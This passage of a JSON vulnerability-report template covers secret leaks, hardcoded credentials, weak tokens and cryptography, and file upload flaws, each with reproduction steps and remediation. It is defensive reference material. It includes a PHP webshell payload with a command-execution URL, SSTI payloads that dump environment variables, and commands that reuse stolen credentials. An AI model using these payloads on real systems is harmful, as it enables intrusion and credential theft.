                  "target": "[Specify affected asset, e.g., myapp.example.com]",
                  "url_location": "[Full URL containing the secret, e.g., https://myapp.example.com/dashboard?auth_token=supersecret123]",
                  "steps_to_reproduce": [
                    "1. Identify an application that passes sensitive information in the URL's query string or fragment.",
                    "2. **[Scenario A: Sensitive Data in Query String]**",
                    "   a. Log in or perform an action that triggers a URL containing sensitive data (e.g., `https://myapp.example.com/profile?user_id=123&session_id=ABCD`).",
                    "   b. Observe the URL in the browser's address bar or network requests.",
                    "   c. **[What happened]**: The `session_id` or `user_id` (if sensitive) is visible in the URL.",
                    "   d. **[What should happen]**: Sensitive data should not be placed in URLs. It can be exposed via browser history, bookmarks, proxy logs, and `Referer` headers.",
                    "3. **[Scenario B: Referer Header Leakage]**",
                    "   a. Navigate to a page on `myapp.example.com` that has sensitive data in its URL (e.g., `https://myapp.example.com/sensitive_report?token=XYZ`).",
                    "   b. From that page, click on any external link (e.g., an advertisement, a link to a third-party image, or a link to `attacker.com`).",
                    "   c. On the `attacker.com` server, inspect the incoming request's `Referer` header.",
                    "   d. **[What happened]**: The `Referer` header contains the full URL of the previous page, including the `token=XYZ` parameter, which is leaked to `attacker.com`.",
                    "   e. **[What should happen]**: The `Referer` header should be controlled (e.g., via `Referrer-Policy`) to prevent leakage of sensitive URLs to third parties.",
                    "4. **[Scenario C: Secrets in URL Fragments]**",
                    "   a. Some single-page applications or older OAuth flows might put tokens in URL fragments (e.g., `https://myapp.example.com/#access_token=ABC`).",
                    "   b. While fragments are typically not sent to the server in the `Referer` header for navigation to *different* domains, they can still be logged client-side, be visible in browser history, and be vulnerable to XSS if not properly handled when used in DOM sinks.",
                    "   c. **[What happened]**: Sensitive data is exposed client-side and can be logged or accessed by malware."
                  ],
                  "proof_of_concept": {
                    "url_example": "https://myapp.example.com/login_callback?code=AUTHCODE123&state=STATE456&access_token=SENSITIVE_TOKEN_123",
                    "notes": "Provide the full URL containing the leaked secret. Explain where the secret is visible (browser history, logs, or how a `Referer` header leakage can be observed). If demonstrating `Referer` leakage, include the attacker's server log entry showing the leaked `Referer` header."
                  },
                  "impact": "Session hijacking (if session IDs/tokens are leaked). Unauthorized data access (if API keys or data are leaked). Exposure of sensitive personal information. Compliance violations. Can lead to account takeover or other attacks if the leaked secret is critical.",
                  "remediation_suggestion": "Never transmit sensitive information (e.g., session IDs, authentication tokens, API keys, personal data) directly in the URL's query string or fragment. Use HTTP POST requests for sensitive data submission. Store session and authentication tokens in `HttpOnly` and `Secure` cookies. Implement a strict `Referrer-Policy` HTTP header (e.g., `no-referrer`, `same-origin`) to control what information is sent in the `Referer` header. Ensure server-side logs do not capture sensitive parameters from URLs."
                },
                {
                  "vulnerability_name": "Hardcoded Credentials",
                  "summary": "Hardcoded credentials occur when sensitive authentication details (e.g., usernames, passwords, default API keys, database credentials) are directly embedded within the application's source code, configuration files, or binaries. This makes them easily discoverable by attackers, leading to unauthorized access, system compromise, or data breaches.",
                  "severity": "Critical",
                  "target": "[Specify affected asset, e.g., backend.example.com]",
                  "url_location": "[N/A - vulnerability is in code/config, not URL]",
                  "steps_to_reproduce": [
                    "1. Obtain access to the application's source code (e.g., via public repositories, misconfigured servers, or decompilation of binaries/mobile apps).",
                    "2. Search the codebase (e.g., using `grep`, `strings`, or IDE search functions) for common keywords like `password`, `user`, `db_user`, `secret`, `api_key`, `key`, `credential`, `admin_password`.",
                    "3. Identify instances where these values are directly assigned as string literals or within configuration files that are part of the deployable artifact.",
                    "4. **[What happened]**: A username `admin` and password `changeme123` were found hardcoded in `src/main/java/com/example/Config.java`.",
                    "5. **[What should happen]**: Credentials should be stored securely using environment variables, dedicated secrets management systems (e.g., HashiCorp Vault, AWS Secrets Manager), or configuration files loaded at runtime from secure locations, not hardcoded within the application bundle.",
                    "6. Use the discovered hardcoded credentials to attempt authentication or access relevant resources (e.g., `ssh admin@server_ip`, `mysql -u db_user -p hardcoded_pass`)."
                  ],
                  "proof_of_concept": {
                    "code_snippet_example": "public static final String DB_USER = \"dbuser\";\npublic static final String DB_PASSWORD = \"hardcoded_password_123\";",
                    "notes": "Provide the exact code snippet or configuration file path and line number where the hardcoded credentials were found. Show evidence of successful exploitation using these credentials (e.g., login screenshot, database query result, successful API call). Avoid disclosing actual production credentials in public reports."
                  },
                  "impact": "Complete system compromise, unauthorized database access, full data exfiltration, privilege escalation, and lateral movement within the network. Hardcoded credentials bypass all authentication controls and pose an extreme security risk.",
                  "remediation_suggestion": "Remove all hardcoded credentials from the source code and configuration files. Implement a secure secrets management solution (e.g., environment variables, Vault, AWS Secrets Manager, Azure Key Vault) to store and retrieve credentials at runtime. Follow the principle of least privilege for all credentials. Rotate credentials regularly."
                },
                {
                  "vulnerability_name": "Hardcoded API Keys or Secrets",
                  "summary": "Hardcoded API keys or secrets are sensitive credentials (e.g., API keys for external services, cryptographic keys, secret tokens) directly embedded in client-side code (JavaScript bundles, mobile apps), public repositories, or client-facing configuration files. This exposes them to anyone who can access the client, allowing unauthorized use of services, API abuse, or data compromise.",
                  "severity": "High",
                  "target": "[Specify affected asset, e.g., mobileapp.example.com or api.example.com]",
                  "url_location": "[N/A - vulnerability is in code/config/assets]",
                  "steps_to_reproduce": [
                    "1. Access the application's client-side resources (e.g., inspect network requests, view page source, decompile mobile application APK/IPA, analyze JavaScript bundles).",
                    "2. Search for common keywords like `api_key`, `secret`, `token`, `stripe_key`, `firebase_key`, `google_api_key`, `jwt_secret`, `encryption_key`.",
                    "3. **[Scenario A: In JavaScript Bundles]**",
                    "   a. Navigate to the application's website. Open browser developer tools -> Sources tab.",
                    "   b. Search through JavaScript files (e.g., `app.js`, `bundle.js`, `vendor.js`) for hardcoded API keys.",
                    "   c. **[What happened]**: A Stripe public key or a Google Maps API key with insufficient restrictions was found directly in the JavaScript.",
                    "   d. **[What should happen]**: Public keys for client-side services (like Stripe publishable keys) are often expected to be client-side but should have strong domain/referrer restrictions. Sensitive *private* keys should never be client-side.",
                    "4. **[Scenario B: In Mobile Application Binaries]**",
                    "   a. Obtain the mobile application's APK or IPA file.",
                    "   b. Use decompilation tools (e.g., `jadx`, `Ghidra`) to analyze the source code or `strings` command to find sensitive strings.",
                    "   c. **[What happened]**: A Firebase API key or a secret key for an internal API was found hardcoded.",
                    "5. **[Scenario C: Exposed in Public Repositories]**",
                    "   a. Search public code repositories (e.g., GitHub, GitLab) for the organization's name or application name.",
                    "   b. Look for committed API keys or secrets in source code, configuration files, or `.env` files that were accidentally committed.",
                    "   c. **[What happened]**: A private API key for a payment gateway was found in a public repository.",
                    "6. Use the discovered API key/secret to make unauthorized API calls or interact with the associated service."
                  ],
                  "proof_of_concept": {
                    "code_snippet_example": "const GOOGLE_API_KEY = \"AIzaSyDRWd3B4C5E6F7G8H9I0J1K2L3M4N5O6P7Q\";",
                    "notes": "Provide the exact location (file name, line number if possible) where the API key/secret was found. If it's a publicly usable API key, demonstrate its unauthorized use (e.g., successful API call from an external tool, screenshot of API usage dashboard). Emphasize if the key allows sensitive actions or bypasses rate limits. For sensitive private keys, explain the potential impact."
                  },
                  "impact": "Unauthorized access to external services (e.g., payment gateways, cloud services, internal APIs). Abuse of API quotas, leading to financial costs for the organization. Impersonation, data exposure, and denial of service if the key provides critical access. Can lead to a full system compromise if the key grants high privileges.",
                  "remediation_suggestion": "Remove all hardcoded API keys and secrets from client-side code, public repositories, and client-facing configuration files. Use environment variables or a secure secrets management solution for server-side secrets. For client-side API keys that must be exposed (e.g., Google Maps API key), ensure strict API key restrictions (e.g., HTTP referrer restrictions, IP restrictions, API-specific usage limits). Implement a Backend-for-Frontend (BFF) pattern to proxy sensitive API calls through a trusted backend, keeping the actual secret on the server."
                },
                {
                  "vulnerability_name": "Sensitive Data in Logs",
                  "summary": "Sensitive Data in Logs occurs when Personally Identifiable Information (PII), authentication credentials (passwords, tokens), financial details, or other confidential data are inadvertently written to application, web server, or proxy logs. This can lead to data exposure if log files are not adequately secured, leading to privacy violations and compliance issues.",
                  "severity": "Medium",
                  "target": "[Specify affected asset, e.g., backend.example.com or logging.example.com]",
                  "url_location": "[Any endpoint processing sensitive data, e.g., https://backend.example.com/login, https://backend.example.com/register]",
                  "steps_to_reproduce": [
                    "1. Identify endpoints that handle sensitive data (e.g., login forms, registration forms, payment forms, profile update forms, API endpoints with sensitive payloads).",
                    "2. Perform a successful (or failed) action on such an endpoint (e.g., log in with username/password, register with email/phone, make a payment with credit card details).",
                    "3. Access the application's server logs (e.g., application logs, web server access logs like Apache/Nginx, proxy logs, database query logs) if you have permission, or infer logging behavior from error messages.",
                    "4. **[Scenario A: Passwords in Logs]**",
                    "   a. Attempt to log in with invalid credentials.",
                    "   b. If logging is verbose, check the logs for entries containing the full password, even if hashed.",
                    "   c. **[What happened]**: The plaintext password or the hash of the password (before appropriate salting and hashing) is found in the logs.",
                    "   d. **[What should happen]**: Passwords should never be logged in any form except perhaps as a securely hashed value *after* processing, never plaintext or an intermediate hash.",
                    "5. **[Scenario B: PII/Financial Data in Logs]**",
                    "   a. Submit a form containing PII (e.g., name, email, phone, address) or financial data (e.g., credit card number, bank account details).",
                    "   b. Check the logs for these plaintext values.",
                    "   c. **[What happened]**: Full credit card numbers or other PII are logged.",
                    "   d. **[What should happen]**: Sensitive data should be redacted or masked in logs. Only necessary, non-sensitive information should be logged.",
                    "6. **[Scenario C: Session Tokens/API Keys in Logs]**",
                    "   a. Make an authenticated request with a session token or API key in the header or body.",
                    "   b. Check access logs or application logs for the full token string.",
                    "   c. **[What happened]**: The full token is logged, making it vulnerable if logs are compromised.",
                    "   d. **[What should happen]**: Tokens should be masked or truncated in logs."
                  ],
                  "proof_of_concept": {
                    "log_entry_example": "[2025-05-27 10:30:15] DEBUG: User login attempt - username: testuser, password: MySecretPassword123!",
                    "notes": "Provide a sample log entry (redacted if necessary) showing the sensitive data. Clearly state the type of sensitive data leaked and the location of the logs (e.g., 'password found in application debug logs at /var/log/app.log'). If direct access to logs isn't possible, explain how the inference was made (e.g., 'Error messages indicate sensitive query parameters are logged')."
                  },
                  "impact": "Data breach, privacy violations (GDPR, CCPA), account takeover, financial fraud, and non-compliance with industry standards (e.g., PCI DSS). Compromised log files can be a goldmine for attackers, revealing valuable information for further attacks.",
                  "remediation_suggestion": "Implement a strict logging policy to prevent sensitive data from being logged. Redact or mask PII, credit card numbers, passwords, and full authentication tokens before they are written to any log file. Configure logging frameworks to explicitly exclude or obfuscate sensitive parameters. Regularly audit log contents and access controls. Ensure logs are stored securely with restricted access and appropriate retention policies."
                },
                {
                  "vulnerability_name": "Weak Token Generation",
                  "summary": "Weak Token Generation occurs when an application generates security-sensitive tokens (e.g., session IDs, password reset tokens, activation codes, CSRF tokens) using insufficient randomness or predictable algorithms. This makes it possible for an attacker to guess or brute-force valid tokens, leading to session hijacking, account takeover, or bypassing security controls.",
                  "severity": "High",
                  "target": "[Specify affected asset, e.g., auth.example.com]",
                  "url_location": "[Any endpoint generating tokens, e.g., https://auth.example.com/forgot_password]",
                  "steps_to_reproduce": [
                    "1. Identify an endpoint that generates a security-sensitive token (e.g., request a password reset link, generate an account activation link, observe session ID generation).",
                    "2. Collect multiple samples of the generated tokens.",
                    "3. **[Scenario A: Sequential/Predictable Tokens]**",
                    "   a. Request multiple password reset tokens or session IDs.",
                    "   b. Observe if the tokens are sequential (e.g., `12345`, `12346`) or follow a predictable pattern (e.g., based on timestamp, username, or a small counter).",
                    "   c. **[What happened]**: The generated tokens are easily predictable, allowing an attacker to guess a valid token for another user.",
                    "   d. **[What should happen]**: Tokens should use cryptographically strong pseudo-random number generators (CSPRNGs) and have sufficient entropy.",
                    "4. **[Scenario B: Insufficient Length/Character Set]**",
                    "   a. Analyze the length and character set of the generated token (e.g., 6 digits, only lowercase letters).",
                    "   b. Calculate the entropy and assess if it's too low for the required security level (e.g., a 6-digit PIN has only 1,000,000 possibilities, easily brute-forced).",
                    "   c. **[What happened]**: The token has insufficient entropy, making it vulnerable to brute-force attacks.",
                    "   d. **[What should happen]**: Tokens should be long enough and use a sufficiently large character set (alphanumeric, special characters) to ensure high entropy (at least 128 bits for critical tokens).",
                    "5. **[Scenario C: Reusing Seeds/Weak Algorithm]**",
                    "   a. If the token is generated by a specific algorithm, attempt to reverse-engineer or guess the seed if it's based on weak inputs (e.g., `time()`).",
                    "   b. **[What happened]**: With knowledge of the algorithm or seed, valid tokens can be generated.",
                    "   c. **[What should happen]**: Use secure, built-in functions for generating random bytes (e.g., `crypto.randomBytes` in Node.js, `secrets.token_hex` in Python, `SecureRandom` in Java)."
                  ],
                  "proof_of_concept": {
                    "token_example": "1A2B3C",
                    "notes": "Provide multiple examples of the generated tokens. Explain the observed predictability or the calculated low entropy. If a brute-force was successful (e.g., for a 6-digit PIN), describe the method and time taken. Demonstrate how a guessed token could be used to compromise an account (e.g., using a guessed password reset token to change a victim's password)."
                  },
                  "impact": "Account takeover (via guessed password reset tokens, activation codes), session hijacking (via predictable session IDs), and bypass of multi-factor authentication or other security controls. This undermines the integrity of authentication and authorization mechanisms.",
                  "remediation_suggestion": "Use cryptographically strong pseudo-random number generators (CSPRNGs) for all security-sensitive token generation. Ensure tokens have sufficient length and entropy (at least 128 bits) to resist brute-force attacks. Implement robust rate limiting on token validation endpoints to prevent brute-force attempts even if tokens are weak. Ensure tokens are single-use and expire after a short period (especially for password reset/activation tokens)."
                },
                {
                  "vulnerability_name": "Improper Token Invalidation",
                  "summary": "Improper Token Invalidation occurs when an application fails to properly invalidate or revoke security-sensitive tokens (e.g., session IDs, JWTs, password reset tokens, refresh tokens) after critical events like logout, password change, account deactivation, or when the token has expired. This can allow attackers to continue using compromised tokens to maintain access.",
                  "severity": "High",
                  "target": "[Specify affected asset, e.g., myaccount.example.com]",
                  "url_location": "[Any endpoint requiring authentication, e.g., https://myaccount.example.com/profile]",
                  "steps_to_reproduce": [
                    "1. Obtain a valid authentication token (e.g., session cookie, JWT, API key).",
                    "2. Perform a critical action that *should* invalidate the token.",
                    "3. **[Scenario A: Logout Does Not Invalidate Session]**",
                    "   a. Log in to the application and capture your session cookie/JWT.",
                    "   b. Perform a 'Logout' action.",
                    "   c. Attempt to use the captured session cookie/JWT to access an authenticated endpoint.",
                    "   d. **[What happened]**: The captured token is still accepted by the server, allowing access to the account despite logging out.",
                    "   e. **[What should happen]**: Logout should invalidate the session server-side, making the token unusable.",
                    "4. **[Scenario B: Password Change Does Not Invalidate Sessions]**",
                    "   a. Log in and capture your session token.",
                    "   b. Change your account password.",
                    "   c. Attempt to use the original session token to access an authenticated endpoint.",
                    "   d. **[What happened]**: The old session token remains active, allowing continued access with the old session.",
                    "   e. **[What should happen]**: Changing password should invalidate all active sessions for that account.",
                    "5. **[Scenario C: Account Deactivation Does Not Invalidate Sessions]**",
                    "   a. Log in and capture your session token.",
                    "   b. Deactivate your account (if possible).",
                    "   c. Attempt to use the original session token to access the deactivated account.",
                    "   d. **[What happened]**: The token is still valid, allowing access to a supposedly deactivated account.",
                    "6. **[Scenario D: Password Reset Tokens Not Single-Use/Expired]**",
                    "   a. Request a password reset token.",
                    "   b. Use the token to reset the password.",
                    "   c. Attempt to use the *same* token again to reset the password a second time.",
                    "   d. **[What happened]**: The token is reusable, allowing multiple password resets.",
                    "   e. **[What should happen]**: Password reset tokens should be single-use and expire after a short time."
                  ],
                  "proof_of_concept": {
                    "notes": "Provide the steps taken (e.g., 'logged in, copied session cookie, logged out, re-used cookie'). Show screenshots or a video demonstrating that the token remains valid and allows access even after the invalidation event. Include the specific token and the endpoint that still accepts it."
                  },
                  "impact": "Account takeover, persistent unauthorized access, and sensitive data exposure. If a user logs out from a public computer, their session could remain active. If a password is changed due to compromise, the old session could still be used by the attacker.",
                  "remediation_suggestion": "Implement robust server-side invalidation for all security-sensitive tokens on critical events: Logout: invalidate session in a centralized store. Password Change: Invalidate all active sessions for that user. Account Deactivation: Invalidate all sessions. Password Reset Tokens: Make them single-use and short-lived. For JWTs, maintain a server-side blacklist/revocation list for revoked tokens. Ensure all endpoints enforce token validation against the current session state."
                },
                {
                  "vulnerability_name": "API Key Misuse/Exposure",
                  "summary": "API Key Misuse/Exposure refers to vulnerabilities where API keys are improperly used (e.g., used on client-side when they should be server-side, or have excessive permissions) or are exposed to unauthorized parties (e.g., via referrer leaks, public code, or insecure storage). This can lead to unauthorized API calls, quota abuse, and access to sensitive functionalities.",
                  "severity": "Medium",
                  "target": "[Specify affected asset, e.g., api.example.com or mobileapp.example.com]",
                  "url_location": "[Any endpoint using API keys, e.g., https://api.example.com/data/fetch]",
                  "steps_to_reproduce": [
                    "1. Identify an API key being used by the application (e.g., in network requests, client-side code, mobile app binaries).",
                    "2. **[Scenario A: Client-Side Exposed API Key with Insufficient Restrictions]**",
                    "   a. Find an API key in client-side JavaScript or a mobile app bundle.",
                    "   b. Check the vendor's documentation or attempt to use the API key directly from an external tool (e.g., Postman, `curl`) to make API calls that are not typically allowed from a public client (e.g., writing data, accessing other users' data, exceeding rate limits).",
                    "   c. **[What happened]**: The API key, despite being client-side, allows unauthorized operations or bypasses rate limits. This often occurs because the API key is not restricted by origin (HTTP Referer) or IP address.",
                    "   d. **[What should happen]**: Client-side API keys should have strict restrictions (e.g., allowed HTTP referrers, specific IP ranges, limited API methods). Sensitive operations should only use server-side API keys.",
                    "3. **[Scenario B: API Key with Excessive Permissions]**",
                    "   a. A client-side API key is found for a service (e.g., Firebase, Google Cloud).",
                    "   b. Investigate the API key's associated permissions. Often, client-side keys are mistakenly granted permissions for server-side operations (e.g., database write access, IAM management).",
                    "   c. **[What happened]**: The API key allows the attacker to read/write/delete data that should be protected, or manage other users.",
                    "   d. **[What should happen]**: API keys should follow the principle of least privilege.",
                    "4. **[Scenario C: API Key Leakage via Referer/URL]**",
                    "   a. (Already covered in 'Secrets in URLs / Referer Leaks') If the API key is passed in the URL, it can be leaked to third parties via the Referer header.",
                    "5. **[Scenario D: Hardcoded API Key (already covered)]**",
                    "   a. (Already covered in 'Hardcoded API Keys or Secrets') When API keys are directly in code or config."
                  ],
                  "proof_of_concept": {
                    "api_key_example": "some_public_api_key_XYZ123",
                    "notes": "Provide the API key found and its location. Demonstrate how the key can be misused (e.g., `curl` command showing successful API call from an unauthorized origin, or an API call performing a sensitive action). Describe the specific excessive permissions or lack of restrictions that enable the misuse."
                  },
                  "impact": "Unauthorized access to external services, abuse of quotas, financial costs (e.g., cloud service bills), data exposure, and potential account takeover if the API key has high privileges. Damages the security posture and can lead to service disruption.",
                  "remediation_suggestion": "Implement the principle of least privilege for all API keys. Client-side API keys should have the most restrictive permissions possible and be strictly limited by HTTP referrer, IP address, or allowed API methods. Never expose private API keys on the client-side. Use a Backend-for-Frontend (BFF) architecture for sensitive API calls. Rotate API keys regularly. Monitor API key usage for anomalies."
                },
                {
                  "vulnerability_name": "Environment Variable Exposure",
                  "summary": "Environment Variable Exposure occurs when sensitive information (e.g., API keys, database credentials, application secrets) stored in environment variables on a server is inadvertently exposed through misconfigured web servers, verbose error messages, server-side template injection, or other information disclosure vulnerabilities.",
                  "severity": "High",
                  "target": "[Specify affected asset, e.g., webserver.example.com]",
                  "url_location": "[Any endpoint causing verbose errors or information disclosure, e.g., https://webserver.example.com/error_page]",
                  "steps_to_reproduce": [
                    "1. Identify an application that utilizes environment variables for sensitive configuration.",
                    "2. **[Scenario A: Verbose Error Messages]**",
                    "   a. Trigger an error condition in the application (e.g., provide invalid input, try to access a non-existent page, cause an unhandled exception).",
                    "   b. Observe the error messages displayed to the user or captured in developer tools.",
                    "   c. **[What happened]**: The error message includes a stack trace or debug output that reveals sensitive environment variables (e.g., `DATABASE_URL`, `STRIPE_SECRET_KEY`).",
                    "   d. **[What should happen]**: Error messages should be generic and not expose internal system details or sensitive variables.",
                    "3. **[Scenario B: Server-Side Template Injection (SSTI) / Code Injection]**",
                    "   a. Identify an SSTI vulnerability where user input is rendered directly by a server-side template engine.",
                    "   b. Inject a payload that can access environment variables (e.g., `{{ config.ENV }}`, `{{ request.env }}`, or similar syntax depending on the template engine like Jinja2, Twig, etc.).",
                    "   c. **[What happened]**: The template engine renders the environment variables as part of the page content.",
                    "   d. **[What should happen]**: Input should be sanitized or sandboxed to prevent arbitrary code execution or environment variable access.",
                    "4. **[Scenario C: Misconfigured Server Information Disclosure]**",
                    "   a. Check for common server information endpoints or files (e.g., `/phpinfo.php`, `.env` files in web root, `/.git/config` for git repositories).",
                    "   b. **[What happened]**: A misconfigured web server directly serves a file containing environment variables or allows directory listing showing `.env` files.",
                    "   c. **[What should happen]**: Sensitive configuration files should not be served by the web server, and directory listing should be disabled.",
                    "5. **[Scenario D: Remote Code Execution (RCE) / Command Injection]**",
                    "   a. If an RCE or command injection vulnerability exists, use commands like `printenv`, `env`, or `set` (on Windows) to dump environment variables.",
                    "   b. **[What happened]**: The attacker successfully executes commands that reveal all environment variables."
                  ],
                  "proof_of_concept": {
                    "error_message_snippet": "Error: Failed to connect to DB. DB_HOST=localhost DB_USER=root DB_PASSWORD=my_dev_password",
                    "notes": "Provide the exact error message, endpoint, or method used to expose the environment variables. Show a screenshot of the leaked information. Clearly state the type of sensitive data exposed (e.g., 'Database credentials exposed in verbose error page at /api/data')."
                  },
                  "impact": "Exposure of sensitive credentials (database passwords, API keys for external services), cryptographic keys, and other application secrets. Leads to unauthorized access, system compromise, and data breaches. Undermines the security of the entire application and associated infrastructure.",
                  "remediation_suggestion": "Never expose sensitive environment variables directly in error messages or client-facing output. Configure web servers to hide verbose error messages in production. Disable debugging modes in production. Ensure sensitive configuration files (e.g., `.env`) are outside the web root or strictly inaccessible. Implement robust input validation and sandboxing to prevent server-side template injection or command injection that could expose environment variables. Use a secrets management solution for sensitive data instead of relying solely on environment variables."
                },
                {
                  "vulnerability_name": "Sensitive Data in Client-Side Code/Bundles",
                  "summary": "Sensitive Data in Client-Side Code/Bundles occurs when confidential information (e.g., internal API endpoints, logic for feature flags, business rules, hardcoded API keys for external services with poor restrictions) is exposed within publicly accessible JavaScript files, CSS, or other client-side assets. While not always directly exploitable, it provides attackers with valuable intelligence about the application's internal workings and potential attack vectors.",
                  "severity": "Low",
                  "target": "[Specify affected asset, e.g., portal.example.com]",
                  "url_location": "[Any page loading client-side code, e.g., https://portal.example.com/app.js]",
                  "steps_to_reproduce": [
                    "1. Navigate to the application's website.",
                    "2. Open browser developer tools (F12) and go to the 'Sources' or 'Network' tab.",
                    "3. Inspect loaded JavaScript files, CSS files, and other static assets.",
                    "4. **[Scenario A: Internal API Endpoints/Logic]**",
                    "   a. Search for patterns like `/api/v1/internal_admin_only_endpoint`, or variable names like `isAdminFeatureEnabled = true` or `maxAllowedLoginAttempts = 3`.",
                    "   b. **[What happened]**: The JavaScript bundle reveals internal API paths or business logic that could be probed for vulnerabilities, even if they are authorization-protected on the server.",
                    "   c. **[What should happen]**: Sensitive API paths or core business logic should not be exposed in client-side code. Feature flags should be managed server-side.",
                    "5. **[Scenario B: Configuration Data/Feature Flags]**",
                    "   a. Look for configuration objects or hardcoded lists that might reveal internal details (e.g., a list of all possible user roles, even privileged ones not meant for regular users, or internal system IDs).",
                    "   b. **[What happened]**: The client-side code contains details about features or roles that are not yet publicly released or are privileged, providing hints to an attacker.",
                    "6. **[Scenario C: Obfuscation/Minification Not Sufficient]**",
                    "   a. Even if code is minified/obfuscated, use a beautifier to analyze the code. Sensitive strings can often still be found.",
                    "   b. **[What happened]**: Despite obfuscation, cleartext sensitive information is present."
                  ],
                  "proof_of_concept": {
                    "code_snippet_example": "var internalApi = '/api/v2/admin/data_export';\nvar featureFlags = { 'admin_dashboard_enabled': true, 'beta_feature_x': false };",
                    "notes": "Provide the exact code snippet from the client-side bundle (e.g., `app.js`) and its location. Explain why the revealed information is sensitive (e.g., 'This internal API endpoint reveals a hidden attack surface'). Screenshots of the browser's developer tools showing the code are helpful."
                  },
                  "impact": "Information disclosure, reconnaissance aid for attackers, potential for targeted attacks against hidden APIs or features. While not directly exploitable for high impact, it significantly lowers the bar for an attacker to understand the application's attack surface and find deeper vulnerabilities.",
                  "remediation_suggestion": "Avoid embedding sensitive logic, internal API endpoints, or confidential configuration details directly in client-side code. Use server-side rendering or API calls to fetch only necessary, non-sensitive data for the client. Implement robust server-side access control for all internal API endpoints, regardless of whether they are exposed in client-side code. While minification and obfuscation can help, they are not security controls for sensitive information."
                },
                {
                  "vulnerability_name": "Weak Cryptography",
                  "summary": "Weak Cryptography involves the use of outdated, broken, or insecure cryptographic algorithms, protocols, or key management practices. This can render encrypted data vulnerable to decryption, compromise the integrity of communications, or allow attackers to forge digital signatures, leading to data breaches, impersonation, or system compromise.",
                  "severity": "High",
                  "target": "[Specify affected asset, e.g., api.example.com or mail.example.com]",
                  "url_location": "[Any endpoint using cryptography, e.g., https://api.example.com/encrypt_data]",
                  "steps_to_reproduce": [
                    "1. Identify where cryptography is used in the application (e.g., data encryption at rest/in transit, password hashing, digital signatures, token generation, SSL/TLS).",
                    "2. **[Scenario A: Outdated/Weak Hashing Algorithms for Passwords]**",
                    "   a. Intercept a user registration or password change request.",
                    "   b. If possible, gain access to the password hash (e.g., from a database leak, or if logged insecurely).",
                    "   c. Analyze the password hash to identify the algorithm used (e.g., MD5, SHA1, unsalted SHA256).",
                    "   d. Attempt to crack the hash using tools like `hashcat` or `johntheripper` with rainbow tables or brute-force against the weak algorithm.",
                    "   e. **[What happened]**: The password hash is easily cracked due to the weak algorithm or lack of salting/iterations.",
                    "   f. **[What should happen]**: Use strong, modern, slow hashing algorithms (e.g., bcrypt, scrypt, Argon2) with sufficient iterations and unique salts per user.",
                    "3. **[Scenario B: Weak SSL/TLS Configuration]**",
                    "   a. Use a tool like `sslscan`, `testssl.sh`, or online SSL Labs checker against the application's domain.",
                    "   b. **[What happened]**: The scan reveals support for weak cipher suites (e.g., RC4, DES, 3DES), insecure protocols (e.g., SSLv2, SSLv3, TLSv1.0), or common vulnerabilities (e.g., POODLE, Heartbleed, BEAST).",
                    "   c. **[What should happen]**: Only strong, modern TLS protocols and robust cipher suites should be enabled.",
                    "4. **[Scenario C: Use of ECB Mode for Block Ciphers]**",
                    "   a. If the application encrypts data (e.g., user IDs, sensitive parameters) using a block cipher (e.g., AES) without a proper mode (e.g., ECB mode without IV/randomization).",
                    "   b. Encrypt multiple blocks of identical plaintext data. If ECB is used, the ciphertext blocks will be identical.",
                    "   c. **[What happened]**: Repeating patterns are visible in the ciphertext, revealing information about the plaintext.",
                    "   d. **[What should happen]**: Use secure modes like GCM, CBC (with unique IVs), or CTR for block ciphers.",
                    "5. **[Scenario D: Predictable IVs/Nonces]**",
                    "   a. If an IV or nonce is used but is predictable or reused with the same key, it weakens the encryption.",
                    "   b. **[What happened]**: The predictability allows for decryption or forgery."
                  ],
                  "proof_of_concept": {
                    "hash_example": "d41d8cd98f00b204e9800998ecf8427e",
                    "notes": "Clearly identify the cryptographic weakness (e.g., 'MD5 used for password hashing', 'TLS 1.0 enabled'). Provide evidence of the weakness (e.g., output from `sslscan`, or a cracked hash). Explain the security implications of the specific weakness."
                  },
                  "impact": "Compromise of user accounts, decryption of sensitive data, impersonation, integrity violations, and man-in-the-middle attacks. Weak cryptography undermines the confidentiality, integrity, and authenticity of data and communications.",
                  "remediation_suggestion": "Use strong, modern cryptographic algorithms and protocols. For password hashing, use adaptive, slow hashing functions like bcrypt, scrypt, or Argon2 with unique salts and sufficient iterations. Configure SSL/TLS to only allow strong protocols (TLS 1.2, TLS 1.3) and robust cipher suites. Avoid deprecated algorithms (MD5, SHA1 for security, RC4, DES, 3DES). Use secure modes for block ciphers (e.g., AES-GCM) with unique, random Initialization Vectors (IVs)/nonces for each encryption."
                },
                {
                  "vulnerability_name": "File Upload",
                  "summary": "File Upload vulnerabilities arise when an application allows users to upload files without adequate validation or sanitization, potentially enabling attackers to upload malicious files (e.g., webshells, malware, oversized files) that can lead to remote code execution, denial of service, or compromise of the server.",
                  "severity": "Critical",
                  "target": "[Specify affected asset, e.g., uploads.example.com]",
                  "url_location": "[Full URL of the file upload endpoint, e.g., https://uploads.example.com/upload_profile_picture]",
                  "steps_to_reproduce": [
                    "1. Identify an endpoint that allows file uploads (e.g., profile picture, document submission, attachment).",
                    "2. **[Scenario A: Unrestricted File Upload (Webshell)]**",
                    "   a. Attempt to upload a file with an executable extension (e.g., `.php`, `.asp`, `.jsp`, `.aspx`, `.py`, `.sh`, `.exe`) containing a simple webshell payload (e.g., `<?php system($_GET['cmd']); ?>` for PHP).",
                    "   b. Bypass client-side validation by intercepting the request and changing the filename/Content-Type.",
                    "   c. **[What happened]**: The malicious file is successfully uploaded and placed in a web-accessible directory.",
                    "   d. **[What should happen]**: File uploads should be restricted to a whitelist of safe file types, and uploaded files should be stored outside the web root or with non-executable permissions.",
                    "   e. Navigate to the uploaded file's URL (e.g., `https://uploads.example.com/uploads/shell.php?cmd=ls%20-la`) to confirm remote code execution.",
                    "3. **[Scenario B: Oversized File Upload (DoS)]**",
                    "   a. Attempt to upload an extremely large file (e.g., several GBs).",
                    "   b. **[What happened]**: The server attempts to process and store the large file, leading to resource exhaustion (CPU, memory, disk space) and a denial of service.",
                    "   c. **[What should happen]**: Implement strict size limits for file uploads.",
                    "4. **[Scenario C: Archive Bomb]**",
                    "   a. Upload a compressed archive file (e.g., `.zip`, `.tar.gz`) that unpacks into an extremely large number of files or a very large cumulative size.",
                    "   b. **[What happened]**: The server exhausts resources during decompression, leading to DoS.",
                    "   c. **[What should happen]**: Implement size limits for extracted content and scan archives."
                  ],
                  "proof_of_concept": {
                    "uploaded_file_name": "shell.php",
                    "uploaded_file_content": "<?php system($_GET['cmd']); ?>",
